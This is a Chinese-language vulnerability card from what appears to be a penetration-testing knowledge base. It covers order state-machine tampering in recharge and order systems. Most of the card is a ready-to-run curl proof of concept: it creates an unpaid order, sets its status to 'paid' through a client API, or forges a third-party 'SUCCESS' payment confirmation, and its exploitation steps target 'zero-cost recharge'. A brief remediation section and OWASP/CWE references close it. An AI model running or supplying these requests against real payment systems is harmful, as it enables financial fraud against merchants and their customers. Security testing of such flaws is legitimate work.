---
title: 订单状态机篡改（未支付改成已支付 / 已取消再入账）
cve: 无（业务逻辑）
severity: critical
cvss: 9.3
product: 自研充值/订单系统（资金面）
versions: 任意
ports: 80, 443
keywords: 订单, 状态机, 篡改, 未支付, 充值, 资金
entry: /api/order/status  /api/recharge/confirm
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
POST /api/order/create {"amount":100,"channel":"alipay"}
POST /api/order/status {"orderNo":"...","status":2}
GET  /api/order/detail?orderNo=
```

## 前置条件

- 普通会员；能抓下单与状态查询请求。

## PoC

```bash
# 1) 下一单但不支付，记下 orderNo 与初始状态
curl -s -X POST https://target/api/order/create -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' -d '{"amount":100,"channel":"alipay"}' | tee /tmp/o.json
ORDER=$(python3 -c "import json;print(json.load(open('/tmp/o.json'))['data']['orderNo'])")

# 2) 直接把状态改成“已支付”
curl -s -X POST https://target/api/order/status -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' -d "{\"orderNo\":\"$ORDER\",\"status\":2}"
curl -s "https://target/api/order/detail?orderNo=$ORDER" -H "Authorization: Bearer <t>" | head -c 200
# 判定：状态变已支付且余额增加 = 命中

# 3) 或走“确认支付”接口伪造第三方返回
curl -s -X POST https://target/api/recharge/confirm -H "Authorization: Bearer <t>" \
  -d "{\"orderNo\":\"$ORDER\",\"tradeNo\":\"x\",\"status\":\"SUCCESS\"}"
```

## 利用步骤

1. 先下一单（1 元）走通；
2. 状态接口直接改 / 确认接口伪造第三方结果；
3. 命中即“0 成本充值”——资金面 critical；
4. 证据：订单号 + 状态变化 + 余额变化（只充值 1 元）。

## 修复与缓解

- 订单状态只由支付回调（验签）驱动；客户端接口禁止写状态；
- 状态机校验合法迁移；对账核对第三方流水。

## 参考

- OWASP WSTG-BUSL-01；CWE-841。
